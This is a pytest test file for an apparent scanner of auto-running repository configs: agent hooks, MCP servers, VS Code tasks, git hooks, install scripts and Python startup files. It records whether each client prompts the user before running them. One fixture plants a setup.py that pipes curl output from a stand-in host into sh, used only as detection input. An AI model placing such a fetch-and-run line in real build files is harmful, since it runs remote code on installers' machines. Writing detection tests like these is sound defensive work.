from __future__ import annotations

import dataclasses
import json
from pathlib import Path

import pytest
from typer.testing import CliRunner

from autorun_audit import prompts
from autorun_audit.cli import app
from autorun_audit.models import Prompt
from autorun_audit.scanners import pyenv
from autorun_audit.scanners.repo import _HOOK_CONFIGS, _MCP_CONFIGS, scan_repo

# Nothing here is executed; commands are plain strings in config files.


def write(root: Path, rel: str, content: str) -> Path:
    path = root / rel
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(content, encoding="utf-8")
    return path


def hooks(command: str) -> str:
    return json.dumps(
        {"hooks": {"PostToolUse": [{"hooks": [{"type": "command", "command": command}]}]}}
    )


def server(command: str = "node", key: str = "mcpServers") -> str:
    return json.dumps({key: {"s": {"command": command, "args": ["server.js"]}}})


def only(findings, rule, path=None):
    matches = [f for f in findings if f.rule == rule and (path is None or f.path == path)]
    assert len(matches) == 1, matches
    return matches[0]


def test_folder_open_task_never_asks_in_cursor(tmp_path: Path) -> None:
    write(
        tmp_path,
        ".vscode/tasks.json",
        '{"tasks": [{"label": "x", "command": "make", "runOptions": {"runOn": "folderOpen"}}]}',
    )
    finding = only(scan_repo(tmp_path), "vscode.task.folder-open")
    assert finding.prompt is Prompt.NONE
    assert any(note.startswith("Cursor:") for note in finding.prompt_notes)
    assert "(trusted workspace)" not in finding.trigger


def test_claude_hook_needs_trust_except_in_print_mode(tmp_path: Path) -> None:
    write(tmp_path, ".claude/settings.json", hooks("make lint"))
    finding = only(scan_repo(tmp_path), "claude.hook")
    assert finding.prompt is Prompt.FOLDER_TRUST
    assert any("claude -p" in mode for mode in finding.prompt_skipped_when)


@pytest.mark.parametrize(
    ("path", "expected"),
    [
        (".cursor/hooks.json", Prompt.NONE),
        (".gemini/settings.json", Prompt.FOLDER_TRUST),
        (".devin/hooks.json", Prompt.FOLDER_TRUST),
        (".windsurf/hooks.json", Prompt.FOLDER_TRUST),
    ],
)
def test_agent_hook_prompt_depends_on_the_client(
    tmp_path: Path, path: str, expected: Prompt
) -> None:
    write(tmp_path, path, hooks("make lint"))
    assert only(scan_repo(tmp_path), "agent.hook").prompt is expected


@pytest.mark.parametrize(
    ("path", "key", "expected"),
    [
        (".mcp.json", "mcpServers", Prompt.PER_ITEM),
        (".cursor/mcp.json", "mcpServers", Prompt.PER_ITEM),
        (".vscode/mcp.json", "servers", Prompt.FOLDER_TRUST),
        (".gemini/settings.json", "mcpServers", Prompt.FOLDER_TRUST),
        (".roo/mcp.json", "mcpServers", Prompt.NONE),
        (".kiro/settings/mcp.json", "mcpServers", Prompt.NONE),
        (".amazonq/mcp.json", "mcpServers", Prompt.PER_ITEM),
        (".devin/mcp_config.json", "mcpServers", Prompt.NONE),
        (".devin/mcp_config.local.json", "mcpServers", Prompt.NONE),
        (".devin/config.json", "mcpServers", Prompt.NONE),
    ],
)
def test_mcp_server_prompt_depends_on_the_config_file(
    tmp_path: Path, path: str, key: str, expected: Prompt
) -> None:
    write(tmp_path, path, server(key=key))
    assert only(scan_repo(tmp_path), "mcp.stdio-server").prompt is expected


def test_every_scanned_agent_config_has_a_prompt() -> None:
    """A new hook or MCP config file must say whether its client asks first."""
    for relpath, _ in _HOOK_CONFIGS:
        assert relpath in prompts._AGENT_HOOKS, relpath
    for relpath, _, _ in _MCP_CONFIGS:
        assert relpath in prompts._MCP, relpath


def test_dev_container_needs_reopen_in_container(tmp_path: Path) -> None:
    write(
        tmp_path,
        ".devcontainer/devcontainer.json",
        '{"initializeCommand": "make host", "postCreateCommand": "make inside"}',
    )
    found = scan_repo(tmp_path)
    host = only(found, "devcontainer.initializeCommand")
    assert host.prompt is Prompt.MANUAL
    assert "your machine" in host.prompt_notes[0]
    assert only(found, "devcontainer.postCreateCommand").prompt is Prompt.MANUAL


def test_git_hooks_never_ask_once_installed(tmp_path: Path) -> None:
    write(tmp_path, ".git/config", "[core]\n\thooksPath = .githooks\n")
    write(tmp_path, ".githooks/pre-commit", "#!/bin/sh\nmake lint\n")
    write(tmp_path, ".husky/pre-push", "#!/bin/sh\nnpm test\n")
    found = scan_repo(tmp_path)
    assert only(found, "git.hooks-path").prompt is Prompt.NONE
    assert only(found, "git.hook", ".githooks/pre-commit").prompt is Prompt.NONE
    assert only(found, "git.hook", ".husky/pre-push").prompt is Prompt.MANUAL


def test_install_scripts_and_python_build_files_never_ask(tmp_path: Path) -> None:
    write(tmp_path, "package.json", '{"scripts": {"postinstall": "node setup.js"}}')
    write(tmp_path, "setup.py", "import os\nos.system('curl https://example.invalid | sh')\n")
    found = scan_repo(tmp_path)
    assert only(found, "npm.install-script").prompt is Prompt.NONE
    assert only(found, "python.suspicious-build-file").prompt is Prompt.NONE


def test_direnv_asks_again_after_every_edit(tmp_path: Path) -> None:
    write(tmp_path, ".envrc", "export FOO=1\n")
    finding = only(scan_repo(tmp_path), "direnv.envrc")
    assert finding.prompt is Prompt.PER_ITEM


@pytest.mark.parametrize(
    ("event", "expected"),
    [("enter", Prompt.FOLDER_TRUST), ("cd", Prompt.FOLDER_TRUST), ("postinstall", Prompt.NONE)],
)
def test_mise_install_hooks_skip_trust(tmp_path: Path, event: str, expected: Prompt) -> None:
    # Pins the trigger text that prompts.py reads the event from.
    write(tmp_path, "mise.toml", f'[hooks]\n{event} = "echo hi"\n')
    assert only(scan_repo(tmp_path), "mise.hook").prompt is expected


def test_python_startup_code_never_asks(tmp_path: Path) -> None:
    site = tmp_path / "site-packages"
    write(site, "evil.pth", "import os; os.getcwd()\n")
    write(site, "sitecustomize.py", "print('hi')\n")
    found = pyenv.scan_environment(pyenv.environment_from_dirs([site]))
    assert found
    assert all(f.prompt is Prompt.NONE for f in found)


def test_rules_that_dont_run_anything_have_no_prompt(tmp_path: Path) -> None:
    write(tmp_path, ".vscode/settings.json", '{"task.allowAutomaticTasks": "on"}')
    write(tmp_path, ".mcp.json", "{ not json")
    found = scan_repo(tmp_path)
    assert only(found, "vscode.settings.auto-tasks").prompt is None
    assert only(found, "parse-error").prompt is None


def test_prompt_is_not_part_of_the_fingerprint(tmp_path: Path) -> None:
    write(tmp_path, ".claude/settings.json", hooks("make lint"))
    finding = only(scan_repo(tmp_path), "claude.hook")
    bare = dataclasses.replace(finding, prompt=None, prompt_notes=(), prompt_skipped_when=())
    assert bare.fingerprint == finding.fingerprint


def test_json_and_sarif_include_the_prompt(tmp_path: Path) -> None:
    write(tmp_path, ".claude/settings.json", hooks("make lint"))
    runner = CliRunner()

    data = json.loads(runner.invoke(app, ["repo", str(tmp_path), "--format", "json"]).stdout)
    finding = data["findings"][0]
    assert finding["prompt"] == "folder-trust"
    assert finding["prompt_notes"] and finding["prompt_skipped_when"]

    sarif = json.loads(runner.invoke(app, ["repo", str(tmp_path), "--format", "sarif"]).stdout)
    result = sarif["runs"][0]["results"][0]
    assert result["properties"]["prompt"] == "folder-trust"
    assert "Asks first: once per folder" in result["message"]["text"]


def test_text_output_shows_what_each_tool_does(tmp_path: Path) -> None:
    write(tmp_path, ".mcp.json", server())
    result = CliRunner().invoke(app, ["repo", str(tmp_path)], env={"COLUMNS": "200"})
    assert "asks first: yes, for each item" in result.stdout
    assert "Claude Code: asks before using each project server" in result.stdout
    assert "never asks in: `claude -p`" in result.stdout
